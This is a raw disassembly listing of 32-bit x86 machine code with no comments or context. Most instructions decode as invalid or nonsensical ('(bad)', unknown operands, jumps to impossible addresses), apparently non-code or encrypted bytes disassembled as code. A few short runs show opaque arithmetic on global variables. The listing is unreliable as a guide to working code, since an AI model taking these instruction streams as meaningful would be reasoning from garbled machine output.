  4060cc:	dec    ebp
  4060cd:	data16 jecxz 0x4060ce
  4060d0:	or     edx,ebx
  4060d2:	xchg   esi,eax
  4060d3:	lods   eax,DWORD PTR ds:[esi]
  4060d4:	fstp   QWORD PTR [esi+0x64bd8b72]
  4060da:	ja     0x406151
  4060dc:	test   BYTE PTR [esi+0x7a],0x82
  4060e0:	and    edx,DWORD PTR [edi-0x3b]
  4060e3:	fs push ds
  4060e5:	push   ecx
  4060e6:	pop    ebp
  4060e7:	mov    bh,0x5e
  4060e9:	sub    ebp,esi
  4060eb:	cmp    DWORD PTR [edx+ebp*2],eax
  4060ee:	pop    ss
  4060ef:	arpl   bx,cx
  4060f1:	rcr    esp,cl
  4060f3:	or     eax,0xd2b78d03
  4060f8:	sbb    eax,esi
  4060fa:	push   cs
  4060fb:	neg    BYTE PTR [edi-0x56f4b9fd]
  406101:	popa   
  406102:	mov    cl,0xf
  406104:	stos   DWORD PTR es:[edi],eax
  406105:	inc    edi
  406106:	adc    edx,ebx
  406108:	sub    DWORD PTR ss:[esi+0x4],esp
  40610c:	rcr    cl,0x71
  40610f:	mov    eax,0x1f2e4eba
  406114:	out    0xdf,eax
  406116:	stos   DWORD PTR es:[edi],eax
  406117:	add    DWORD PTR [esi],ebx
  406119:	nop
  40611a:	imul   esi,DWORD PTR [edi-0x364cf5b],0xa435e841
  406124:	dec    eax
  406125:	jmp    0x406174
  406127:	hlt    
  406128:	dec    ecx
  406129:	adc    bl,ch
  40612b:	popa   
  40612c:	jmp    DWORD PTR [ecx+0x19]
  40612f:	xlat   BYTE PTR ds:[ebx]
  406130:	inc    ebp
  406131:	pushf  
  406132:	rcl    ecx,1
  406134:	mov    ebp,0x7365369d
  406139:	mov    DWORD PTR [ecx-0x15a640bc],ebp
  40613f:	data16 std 
  406141:	xor    eax,0xc6aa88ce
  406146:	mov    DWORD PTR [esi+0x2d],esi
  406149:	fwait
  40614a:	mov    cl,0x54
  40614c:	xchg   edi,eax
  40614d:	outs   dx,DWORD PTR ds:[esi]
  40614e:	das    
  40614f:	xor    edx,DWORD PTR [esi]
  406151:	pop    es
  406152:	pop    edi
  406153:	cmc    
  406154:	pop    ss
  406155:	push   ds
  406156:	add    BYTE PTR [ecx+0x27a638ca],dl
  40615c:	ret    
  40615d:	or     eax,0xe0607167
  406162:	add    eax,0xc015661b
  406167:	jo     0x4061ae
  406169:	(bad)  
  40616a:	pop    ecx
  40616b:	sti    
  40616c:	jle    0x406145
  40616e:	or     BYTE PTR [ecx],al
  406170:	mov    al,ds:0xcabe3f43
  406175:	pop    ds
  406176:	xor    BYTE PTR [esi-0x72e02455],dl
  40617c:	adc    al,0xa1
  40617e:	in     eax,0x31
  406180:	and    dl,BYTE PTR [ecx]
  406182:	inc    edi
  406183:	aad    0xdf
  406185:	sbb    BYTE PTR [ebp-0x7e],bh
  406188:	add    BYTE PTR [edi-0x41e7d83],ah
  40618e:	pop    ds
  40618f:	add    DWORD PTR [eax],eax
  406191:	or     al,0x69
  406193:	xor    dl,bl
  406195:	xchg   DWORD PTR [edi-0x20a0e151],esp
  40619b:	iret   
  40619c:	mov    bl,0x75
  40619e:	sahf   
  40619f:	arpl   dx,si
  4061a1:	sub    bl,bl
  4061a3:	pusha  
  4061a4:	sub    eax,0xb2ce6f34
  4061a9:	inc    esp
  4061aa:	imul   edi,DWORD PTR [ebx],0xfffffff0
  4061ad:	push   0xffffff90
  4061af:	ror    BYTE PTR [edi-0x4f],1
  4061b2:	call   0x9262:0xabade4ea
  4061b9:	aaa    
  4061ba:	xchg   esp,eax
  4061bb:	or     eax,0xabc3a42f
  4061c0:	xchg   ebx,eax
  4061c1:	add    BYTE PTR [ebx-0xd822362],dl
  4061c7:	mov    al,ds:0x355f2861
  4061cc:	jecxz  0x406197
  4061ce:	mov    ah,ah
  4061d0:	out    0xe4,al
  4061d2:	retf   
  4061d3:	mov    esi,0xecbeef03
  4061d8:	dec    edx
  4061d9:	mul    BYTE PTR [ecx+0x4d5fe73b]
  4061df:	loope  0x406243
  4061e1:	fldcw  WORD PTR [eax-0x27]
  4061e4:	pushf  
  4061e5:	adc    dh,BYTE PTR ss:[eax-0x68]
  4061e9:	pop    eax
  4061ea:	cdq    
  4061eb:	adc    DWORD PTR [ebp+0x182efa8c],esi
  4061f1:	loop   0x406220
  4061f3:	out    dx,al
  4061f4:	sub    eax,0x82902488
  4061f9:	(bad)  
  4061fa:	fwait
  4061fb:	xchg   bh,bh
  4061fd:	sahf   
  4061fe:	(bad)  
  4061ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406200:	push   esi
  406201:	sub    BYTE PTR [ebp+ebx*4-0x5e],bl
  406205:	jmp    0x3ffd2912
  40620a:	outs   dx,DWORD PTR ds:[esi]
  40620b:	and    DWORD PTR [ebp+0x60a31c92],esp
  406211:	jp     0x4061b2
  406213:	pop    edi
  406214:	xchg   BYTE PTR [eax+0x3db32f91],cl
  40621a:	dec    edx
  40621b:	jecxz  0x406246
  40621d:	cmp    eax,DWORD PTR [eax-0xcde5096]
  406223:	rcr    DWORD PTR [eax+0x39ca478e],0xe4
  40622a:	fldenv [ebx+0x67c549a0]
  406230:	adc    eax,0xc1d22b6c
  406235:	arpl   WORD PTR [eax],bx
  406237:	out    0xb8,al
  406239:	sahf   
  40623a:	inc    ecx
  40623b:	test   BYTE PTR [esp+ecx*2+0x22],bl
  40623f:	lods   al,BYTE PTR ds:[esi]
  406240:	push   ebp
  406241:	sub    ecx,DWORD PTR [eax-0x80]
  406244:	fstp   DWORD PTR [esi-0x2e]
  406247:	sahf   
  406248:	ret    0xe678
  40624b:	aad    0xbb
  40624d:	pop    edx
  40624e:	mov    ecx,0x8e96db8e
  406253:	(bad)  
  406254:	out    dx,al
  406255:	rcr    BYTE PTR [ecx-0x14042a7c],0x51
  40625c:	hlt    
  40625d:	push   ds
  40625e:	dec    BYTE PTR [ecx+0x4b98a673]
  406264:	dec    eax
  406265:	dec    ebp
  406266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406267:	mov    dh,0xeb
  406269:	add    dl,BYTE PTR [edx+0x545601fb]
  40626f:	imul   edi,DWORD PTR [ebp-0x14ff5fd4],0xa3da1be0
  406279:	dec    edi
  40627a:	push   0x85a42f01
  40627f:	inc    ebx
  406280:	add    ch,ch
  406282:	lods   eax,DWORD PTR ds:[esi]
  406283:	adc    edi,DWORD PTR [edi-0x423db8d6]
  406289:	dec    edi
  40628a:	push   esp
  40628b:	stc    
  40628c:	dec    ebp
  40628d:	sti    
  40628e:	iret   
  40628f:	jmp    0xbac:0x4a79d82e
  406296:	xchg   BYTE PTR [ecx],cl
  406298:	xchg   esp,eax
  406299:	mul    DWORD PTR [eax+0xf6a624d]
  40629f:	xchg   ebx,eax
  4062a0:	outs   dx,BYTE PTR ds:[esi]
  4062a1:	pop    edx
  4062a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062a3:	mov    ebp,0xc547edab
  4062a8:	in     al,0x17
  4062aa:	es sub eax,0x2dde1d35
  4062b0:	ss mov ebp,0xe75e8d1f
  4062b6:	xlat   BYTE PTR ds:[ebx]
  4062b7:	mov    fs,WORD PTR [edx*1-0x1c776df8]
  4062be:	push   edi
  4062bf:	dec    ecx
  4062c0:	rcl    DWORD PTR [edx-0x2d],cl
  4062c3:	xchg   edi,eax
  4062c4:	push   esi
  4062c5:	adc    bl,BYTE PTR [edx-0x2a407ec3]
  4062cb:	loopne 0x406287
  4062cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062ce:	mov    edx,0x7c1a3980
  4062d3:	pop    eax
  4062d4:	aad    0x96
  4062d6:	call   0xc3d98f5d
  4062db:	push   0x17
  4062dd:	sbb    DWORD PTR [eax],eax
  4062df:	arpl   WORD PTR [edx-0x1392c4b7],di
  4062e5:	and    al,0x9b
  4062e7:	jmp    0xa64516a
  4062ec:	into   
  4062ed:	push   cs
  4062ee:	xchg   esp,eax
  4062ef:	daa    
  4062f0:	mov    esp,0xc87f031c
  4062f5:	jmp    0xc5cca912
  4062fa:	(bad)  
  4062fb:	jb     0x40631b
  4062fd:	mov    ebp,0x17e23daa
  406302:	fdivrp st(5),st
  406304:	xchg   edi,eax
  406305:	aad    0xb8
  406307:	rcr    BYTE PTR [esi+edi*4+0x3fe03f0c],0x27
  40630f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406310:	fwait
  406311:	mov    ds:0x4c923adb,eax
  406316:	repz mov al,0xaa
  406319:	lods   al,BYTE PTR ds:[esi]
  40631a:	ret    0xe0b1
  40631d:	loop   0x406321
  40631f:	aas    
  406320:	dec    edi
  406321:	ds jb  0x406396
  406324:	mov    eax,ds:0xd1c4cb38
  406329:	(bad)  
  40632a:	shl    esi,0xc5
  40632d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40632e:	add    esi,DWORD PTR [ebp+0x9]
  406331:	jg     0x40634d
  406333:	adc    DWORD PTR [ecx+0x21],0x30
  406337:	pop    edi
  406338:	xchg   edi,eax
  406339:	inc    edi
  40633a:	push   cs
  40633b:	sub    DWORD PTR [edi+0x171962ff],esi
  406341:	xor    DWORD PTR [edx],esi
  406343:	or     DWORD PTR [edi-0x13644c18],edi
  406349:	(bad)  
  40634a:	push   ecx
  40634b:	xlat   BYTE PTR ds:[ebx]
  40634c:	inc    edx
  40634d:	jne    0x40637a
  40634f:	xchg   ebp,eax
  406350:	cmp    ebx,ebp
  406352:	inc    esp
  406353:	das    
  406354:	dec    edi
  406355:	push   edi
  406356:	xor    BYTE PTR [eax+0x73f59e4a],bh
  40635c:	(bad)  [esi]
  40635e:	jnp    0x406396
  406360:	fldenv [esi-0x25]
  406363:	or     dl,BYTE PTR [eax-0xe]
  406366:	sbb    al,0xaa
  406368:	push   esi
  406369:	daa    
  40636a:	dec    esp
  40636b:	shr    BYTE PTR [ecx],cl
  40636d:	inc    ebp
  40636e:	xchg   edx,eax
  40636f:	xchg   DWORD PTR [edx-0x1a7488b0],eax
  406375:	fxch   st(7)
  406377:	fcomp  QWORD PTR [ecx-0x23]
  40637a:	(bad)  
  40637b:	dec    esp
  40637c:	enter  0x3d72,0x74
  406380:	arpl   WORD PTR [ebp-0x380ad838],ax
  406386:	ins    DWORD PTR es:[edi],dx
  406387:	push   0x78
  406389:	lock dec esp
  40638b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40638c:	aas    
  40638d:	sbb    eax,esp
  40638f:	into   
  406390:	cs ret 
  406392:	fmul   QWORD PTR [ecx+0x6253fff0]
  406398:	cs inc esp
  40639a:	jmp    0x4bb6afd4
  40639f:	xchg   ecx,eax
  4063a0:	dec    ebx
  4063a1:	cmp    cl,BYTE PTR [ebp+0x21f411c5]
  4063a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063a8:	push   0x4a
  4063aa:	add    cl,BYTE PTR [edx+0x3af291b5]
  4063b0:	int3   
  4063b1:	hlt    
  4063b2:	jmp    0x406362
  4063b4:	dec    ebp
  4063b5:	mov    DWORD PTR [esi+0x2f],ebp
  4063b8:	sbb    DWORD PTR ds:0x78dd819f,edx
  4063be:	jecxz  0x406409
  4063c0:	aas    
  4063c1:	imul   BYTE PTR [eax-0x79]
  4063c4:	iret   
  4063c5:	ins    DWORD PTR es:[edi],dx
  4063c6:	mov    cl,BYTE PTR [edi+eiz*4+0x416b9f5e]
  4063cd:	mov    bl,0x6
  4063cf:	push   ecx
  4063d0:	mov    ecx,0x50b92d6b
  4063d5:	imul   esp,ecx,0x53
  4063d8:	stc    
  4063d9:	pop    ebp
  4063da:	ds jb  0x40637a
  4063dd:	into   
  4063de:	mov    WORD PTR [edx-0x8],fs
  4063e1:	test   DWORD PTR [ecx-0x4e],edi
  4063e4:	loop   0x40643d
  4063e6:	or     al,dl
  4063e8:	or     ebx,DWORD PTR [ebp+0x1473d8dd]
  4063ee:	xchg   esi,eax
  4063ef:	and    BYTE PTR [ecx-0x2a],cl
  4063f2:	stos   DWORD PTR es:[edi],eax
  4063f3:	rcr    ch,cl
  4063f5:	shl    DWORD PTR [edx],1
  4063f7:	pop    esp
  4063f8:	popa   
  4063f9:	sbb    dh,BYTE PTR [ecx-0x5b]
  4063fc:	call   FWORD PTR ds:0xb0657a8e
  406402:	sub    al,0xb4
  406404:	xchg   ebx,eax
  406405:	fild   WORD PTR [esi+0x5857e094]
  40640c:	inc    BYTE PTR [edx]
  40640e:	sub    eax,0xfcc11651
  406413:	jmp    0xd267ab16
  406418:	sbb    al,0xf8
  40641a:	mov    dl,0x71
  40641c:	(bad)  
  40641d:	jmp    0xff86:0xf9528a4
  406424:	idiv   edi
  406426:	call   FWORD PTR [ebx-0x48]
  406429:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430586,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e862
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430592
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x4305b2,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ef0c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e862,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e85a
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0xf9b0784]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	repnz rcr DWORD PTR [edx],1
  4064b0:	mov    ch,0x71
  4064b2:	xor    eax,0xf0b37a68
  4064b7:	fld    QWORD PTR [esi-0x2672ca7d]
  4064bd:	(bad)  
  4064be:	xor    al,0x47
  4064c0:	sti    
  4064c1:	dec    esi
  4064c2:	retf   
  4064c3:	es cmp al,0x7f
  4064c6:	jmp    0x52d5fae4
  4064cb:	mov    bl,0x80
  4064cd:	(bad)  
  4064ce:	adc    DWORD PTR [ebx+0x2bdaf394],0x1d6849e5
  4064d8:	cli    
  4064d9:	mov    ecx,0x552e88cd
  4064de:	loop   0x406519
  4064e0:	es int 0x12
  4064e3:	and    eax,0x55945a3b
  4064e8:	das    
  4064e9:	add    DWORD PTR [esi],eax
  4064eb:	je     0x406503
  4064ed:	push   ecx
  4064ee:	retf   0x6bef
  4064f1:	mov    cl,0x4
  4064f3:	and    DWORD PTR [edx],ebx
  4064f5:	(bad)  
  4064f6:	sbb    BYTE PTR [edx+0x3b],ah
  4064f9:	fcom   DWORD PTR [eax]
  4064fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064fc:	dec    eax
  4064fd:	inc    esi
  4064fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064ff:	mov    ebp,0x3bd1d1a9
  406504:	mov    ah,0x85
  406506:	pop    ss
  406507:	into   
  406508:	or     esi,DWORD PTR [ecx]
  40650a:	aam    0xc
  40650c:	mov    ch,BYTE PTR [eax]
  40650e:	and    ebx,DWORD PTR fs:[edx+esi*8+0x2c]
  406513:	xlat   BYTE PTR ds:[ebx]
  406514:	out    dx,eax
  406515:	pop    edi
  406516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406517:	stos   DWORD PTR es:[edi],eax
  406518:	inc    ebp
  406519:	push   0xc3e4c75a
  40651e:	pop    edi
  40651f:	xor    eax,0x905d5003
  406524:	fcmovb st,st(5)
  406526:	mov    ds:0x19447f6d,al
  40652b:	jmp    0xc53391b9
  406530:	hlt    
  406531:	inc    ebx
  406532:	sahf   
  406533:	sbb    DWORD PTR [ecx+0x4a7dc65e],0x74e595f5
  40653d:	push   eax
  40653e:	pop    ecx
  40653f:	sbb    BYTE PTR [ebx],ch
  406541:	(bad)  
  406542:	sbb    DWORD PTR [ecx-0x302339ca],edx
  406548:	out    0x34,al
  40654a:	push   ds
  40654b:	mov    bh,0xb4
  40654d:	out    0xaa,eax
  40654f:	and    al,0x91
  406551:	imul   ebp,DWORD PTR [eax],0xffffff9d
  406554:	fld    DWORD PTR [edi]
  406556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406557:	nop
  406558:	mov    cl,0x6c
  40655a:	or     al,0x84
  40655c:	ins    BYTE PTR es:[edi],dx
  40655d:	pop    ds
  40655e:	push   0xfd152d3e
  406563:	pop    eax
  406565:	int    0x93
  406567:	xchg   DWORD PTR [edx+esi*8-0x3efeea71],ebp
  40656e:	jb     0x406501
  406570:	jne    0x406578
  406572:	std    
  406573:	mov    ds:0xe000310,eax
  406578:	cmp    esp,DWORD PTR [esi+0x6f]
  40657b:	mov    ebx,0xc5f078eb
  406580:	jmp    0x5481160d
  406585:	mov    ebp,0x1bb030d1
  40658b:	xor    al,0x4e
  40658d:	mov    DWORD PTR [eax+0x518f3bf7],esp
  406593:	mov    ds:0xa4639053,al
  406598:	popa   
  406599:	loopne 0x406560
  40659b:	retf   
  40659c:	mov    esi,0x7c4b0eee
  4065a1:	jmp    0xdc0a:0x4bee2fbb
  4065a8:	mov    esp,0x63c5712
  4065ad:	fwait
  4065ae:	jns    0x406558
  4065b0:	mov    ch,0x84
  4065b2:	sub    bl,BYTE PTR [edi]
  4065b4:	jmp    0x40027a91
  4065b9:	loopne 0x406615
  4065bb:	cwde   
  4065bc:	bound  edx,QWORD PTR [esi+0x35]
  4065bf:	repnz sahf 
  4065c1:	sbb    esp,DWORD PTR [eax+0x4a]
  4065c4:	mov    ch,0xdd
  4065c6:	pop    ebx
  4065c7:	pop    ebx
  4065c8:	arpl   WORD PTR [ebp+0x697db126],bx
  4065ce:	daa    
  4065cf:	in     al,0x6e
  4065d1:	add    DWORD PTR [eax+eiz*1-0x33460d6a],esp
  4065d8:	repnz xlat BYTE PTR ds:[ebx]
  4065da:	(bad)  
  4065db:	xor    dl,BYTE PTR [esi-0x2f]
  4065de:	cs (bad) 
  4065e2:	and    ch,dl
  4065e4:	in     eax,dx
  4065e5:	into   
  4065e6:	adc    DWORD PTR [edi-0x2195cf50],ebp
  4065ec:	cmp    bh,bh
  4065ee:	mov    cl,0x15
  4065f0:	mov    ecx,0x48c9d8b
  4065f5:	call   0x5e17:0xbe99a0b9
  4065fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065fd:	adc    DWORD PTR [ebp-0x6dc8d3a9],0x11215f89
  406607:	push   es
  406608:	cmp    al,0xc0
  40660a:	(bad)  
  40660c:	fwait
  40660d:	push   esi
  40660e:	gs pusha 
  406610:	sbb    ah,ah
  406612:	add    al,0x6b
  406614:	dec    eax
  406615:	scas   eax,DWORD PTR es:[edi]
  406616:	ins    BYTE PTR es:[edi],dx
  406617:	loopne 0x406608
  406619:	mov    edx,0x84ef945
  40661e:	mov    al,ds:0x65a2e758
  406623:	add    eax,0x7bb2cea4
  406628:	and    al,0x9b
  40662a:	or     esp,DWORD PTR [edx-0x53]
  40662d:	ins    BYTE PTR es:[edi],dx
  40662e:	repnz mov dh,0x8e
  406631:	data16 mov cl,BYTE PTR [esi+eax*4+0x53c8bcba]
  406639:	adc    DWORD PTR [esi],0x37456484
  40663f:	ins    BYTE PTR es:[edi],dx
  406640:	mov    al,ds:0xe4e3881c
  406645:	test   eax,0xc3c45ad8
  40664a:	jle    0x4065eb
  40664c:	jno    0x40660e
  40664e:	mov    eax,0xc8814bda
  406653:	in     al,0x20
  406655:	cmp    BYTE PTR [ebp+0x7b5d2616],dl
  40665b:	jb     0x4065ed
  40665d:	mov    ecx,0x493349b8
  406662:	sub    eax,0x2d132a58
  406667:	sbb    al,0x23
  406669:	into   
  40666a:	test   BYTE PTR [edi+0x5e],0xb0
  40666e:	push   edx
  40666f:	or     DWORD PTR ds:0xcb3fdbc6,ecx
  406675:	push   ebx
  406676:	(bad)  
  406677:	mov    DWORD PTR [edx-0x37],ebp
  40667a:	aad    0xb1
  40667c:	jne    0x4065ff
  40667e:	mov    esi,0x2de736e3
  406683:	cmp    eax,0x2fc722aa
  406688:	cs in  al,dx
  40668a:	(bad)  
  40668b:	pushf  
  40668c:	mov    al,0xcd
  40668e:	scas   eax,DWORD PTR es:[edi]
  40668f:	test   al,0x5
  406691:	out    dx,eax
  406692:	xchg   ebp,eax
  406693:	not    BYTE PTR [edi]
  406695:	sbb    DWORD PTR [ebx+0x74],0x2a423be4
  40669c:	and    edi,esp
  40669e:	dec    esp
  40669f:	and    eax,0xf47af6c8
  4066a4:	loop   0x40663c
  4066a6:	jmp    0x406690
  4066a8:	sbb    ebp,edi
  4066aa:	xor    eax,0x2624ac44
  4066af:	push   edx
  4066b0:	cli    
  4066b1:	int    0x1d
  4066b3:	or     BYTE PTR [ecx-0x75f1aa1b],cl
  4066b9:	jnp    0x406721
  4066bb:	inc    ecx
  4066bc:	pop    ebx
  4066bd:	push   ebx
  4066be:	sbb    eax,0x8a0fb9fb
  4066c3:	push   esi
  4066c4:	repz inc esi
  4066c6:	rcl    DWORD PTR [eax+0x588d9d43],1
  4066cc:	adc    BYTE PTR [edx+0xb262963],dh
  4066d2:	faddp  st(1),st
  4066d4:	out    dx,al
  4066d5:	push   cs
  4066d6:	pop    edi
  4066d7:	sbb    cl,BYTE PTR [eax]
  4066d9:	fistp  DWORD PTR [edx+0x49]
  4066dc:	icebp  
  4066dd:	(bad)  
  4066de:	shr    BYTE PTR [esi+0xb961026],1
  4066e4:	jg     0x406716
  4066e6:	clc    
  4066e7:	test   DWORD PTR [eax+eiz*8+0x48dbb7d5],0x1638cfdb
  4066f2:	mov    WORD PTR [ebx],?
  4066f4:	(bad)  
  4066f5:	adc    eax,0xa81ccc58
  4066fa:	sub    ah,BYTE PTR [esi+0x599f8f40]
  406700:	or     BYTE PTR [ecx+0x5],bh
  406703:	jmp    0xcf41:0x6336439
  40670a:	cld    
  40670b:	xor    ah,ch
  40670d:	(bad)  
  40670e:	mov    dh,0x4c
  406710:	(bad)  
  406711:	sub    eax,0x3628f4d2
  406716:	push   ss
  406717:	and    eax,0x82b49510
  40671c:	imul   ebx,DWORD PTR [eax-0x231dd6aa],0xf157bf97
  406726:	sbb    BYTE PTR [edi],dh
  406728:	out    dx,eax
  406729:	stos   DWORD PTR es:[edi],eax
  40672a:	push   0x99e954cb
  40672f:	sub    ch,BYTE PTR [ebp-0x455f6e5b]
  406735:	dec    eax
  406736:	jbe    0x406766
  406738:	mov    edx,ebp
  40673a:	loope  0x406769
  40673c:	sub    esp,ebx
  40673e:	into   
  40673f:	and    ah,BYTE PTR [ebx+edi*2+0x41]
  406743:	aam    0xf7
  406745:	iret   
  406746:	pop    ss
  406747:	test   eax,0x6fd045a8
  40674c:	test   BYTE PTR [edx+0x4c],0x63
  406750:	icebp  
  406751:	das    
  406752:	jb     0x40673c
  406754:	inc    edi
  406755:	sbb    DWORD PTR [ebx+0x79],0x6bece544
  40675c:	dec    ecx
  40675d:	inc    ebx
  40675e:	xchg   ebx,eax
  40675f:	dec    ebx
  406760:	dec    esp
  406761:	popa   
  406762:	pop    edx
  406763:	or     eax,DWORD PTR [esi+0x15b822f6]
  406769:	gs addr16 xchg ebx,eax
  40676c:	push   edx
  40676d:	aas    
  40676e:	mov    WORD PTR cs:[edx],gs
  406771:	xor    al,0x12
  406773:	xchg   edi,eax
  406774:	mov    ds:0x7436d176,eax
  406779:	sub    ecx,eax
  40677b:	jne    0x406798
  40677d:	cdq    
  40677e:	mov    ch,0xea
  406780:	jl     0x4067db
  406782:	repnz and dl,BYTE PTR [ebx+0x5120c2b2]
  406789:	push   ebx
  40678a:	addr16 xor eax,0x5f5ebb25
  406790:	and    cl,BYTE PTR [esi]
  406792:	fiadd  DWORD PTR [edx+ecx*4-0x4d]
  406796:	sub    eax,0xbe7a73a3
  40679b:	in     eax,dx
  40679c:	xor    BYTE PTR ss:[esi-0x792dbf40],bl
  4067a3:	mov    ebp,?
  4067a5:	pop    ebx
  4067a6:	mov    ds:0x97a11d2c,al
  4067ab:	rcl    DWORD PTR [esi],cl
  4067ad:	js     0x406796
  4067af:	pop    ds
  4067b0:	dec    ebp
  4067b1:	hlt    
  4067b2:	out    dx,al
  4067b3:	pop    ecx
  4067b4:	test   al,0xf5
  4067b6:	cmp    eax,0x7d3e0adf
  4067bb:	aam    0xa
  4067bd:	jl     0x4067e4
  4067bf:	sub    al,0x7b
  4067c1:	repnz push edi
  4067c3:	leave  
  4067c4:	push   ds
  4067c5:	aad    0xa0
  4067c7:	push   ss
  4067c8:	ror    BYTE PTR fs:[ebp-0x62],cl
  4067cc:	jbe    0x4067d6
  4067ce:	sahf   
  4067cf:	clc    
  4067d0:	or     bl,BYTE PTR [esi-0x3e131939]
  4067d6:	mov    ?,edi
  4067d8:	fistp  QWORD PTR [edx]
  4067da:	mov    esi,0x1a756e7d
  4067df:	pop    ecx
  4067e0:	and    eax,0xef17f06a
  4067e5:	or     dl,ch
  4067e7:	lea    esi,[ebx+esi*1+0x15c65f8c]
  4067ee:	loopne 0x40685c
  4067f0:	adc    BYTE PTR [edi+0x3],0xc7
  4067f4:	xor    eax,0x7598e1c1
  4067f9:	jo     0x4067fa
  4067fb:	loopne 0x4067c5
  4067fd:	mov    bl,0xee
  4067ff:	es xor eax,0xee3f760a
  406805:	fld    DWORD PTR [ecx-0x4f247dd7]
  40680b:	or     BYTE PTR [esi+0x5b],ch
  40680e:	adc    BYTE PTR [eax+0x6],cl
  406811:	shr    DWORD PTR [edi+0x76cd2f0d],cl
  406817:	mov    ebp,0x758bfb27
  40681c:	or     al,0x81
  40681e:	sbb    eax,0x42ef24
  406823:	stos   BYTE PTR es:[edi],al
  406824:	add    eax,0xc22b0043
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x430652,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ef1c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x43063e
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x4305ba,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x430656,0x43059a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42ef24,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	cld    
  406894:	into   
  406895:	sbb    ch,BYTE PTR [esi+0x7e7e364b]
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	inc    edi
  4068a0:	pop    eax
  4068a1:	inc    edx
  4068a2:	(bad)  
  4068a4:	shl    DWORD PTR [edx+ebx*1+0x65],0x3c
  4068a9:	pop    ecx
  4068aa:	mov    esi,0x1a0f1154
  4068af:	leave  
  4068b0:	xor    DWORD PTR [esi+0x3f],0xffffffef
  4068b4:	mov    edx,DWORD PTR [ebx]
  4068b6:	mov    eax,ds:0x573ee4f2
  4068bb:	and    al,0xa
  4068bd:	out    0xa9,al
  4068bf:	fbstp  TBYTE PTR [eax]
  4068c1:	xchg   ebx,eax
  4068c2:	mov    ch,0x7a
  4068c4:	and    bh,0xaf
  4068c7:	retf   
  4068c8:	adc    DWORD PTR [edx],edx
  4068ca:	cld    
  4068cb:	ror    bl,cl
  4068cd:	call   DWORD PTR [eax]
  4068cf:	rol    BYTE PTR [esi+0x16],0xb4
  4068d3:	add    al,BYTE PTR [edx+0x27efa41b]
  4068d9:	into   
  4068da:	daa    
  4068db:	mov    ecx,0x754905a8
  4068e0:	arpl   bp,cx
  4068e2:	test   BYTE PTR [ebx],0x38
  4068e5:	(bad)  
  4068e7:	sub    BYTE PTR [edx],bh
  4068e9:	mov    bh,ah
  4068eb:	pop    ss
  4068ec:	ret    0xe347
  4068ef:	and    dl,0xe3
  4068f2:	popf   
  4068f3:	fstp   TBYTE PTR [ebx-0x4ba0e82b]
  4068f9:	addr16 out dx,eax
  4068fb:	inc    edx
  4068fc:	in     al,0x71
  4068fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068ff:	pop    ds
  406900:	inc    ebp
  406901:	fucomip st,st(4)
  406903:	fsubr  st(4),st
  406905:	and    ecx,esp
  406907:	jmp    0x4068d1
  406909:	lock daa 
  40690b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40690c:	cs mov ebx,0xa65f9109
  406912:	repnz repz int 0x8c
  406916:	fld    QWORD PTR [edx]
  406918:	call   0xf828:0x8a751348
  40691f:	adc    DWORD PTR [edi-0xdfb82aa],esi
  406925:	push   eax
  406926:	pop    ds
  406927:	pop    edx
  406928:	call   0x98f3c56
  40692d:	or     eax,DWORD PTR [ebx]
  40692f:	add    al,0x1d
  406931:	push   cs
  406932:	ss stos BYTE PTR es:[edi],al
  406934:	inc    edi
  406935:	fdivr  QWORD PTR [esi]
  406937:	in     eax,dx
  406938:	jb     0x4068f9
  40693a:	ss jbe 0x406971
  40693d:	clc    
  40693e:	mov    edi,0x966a493f
  406943:	mov    eax,ds:0xbde66ed2
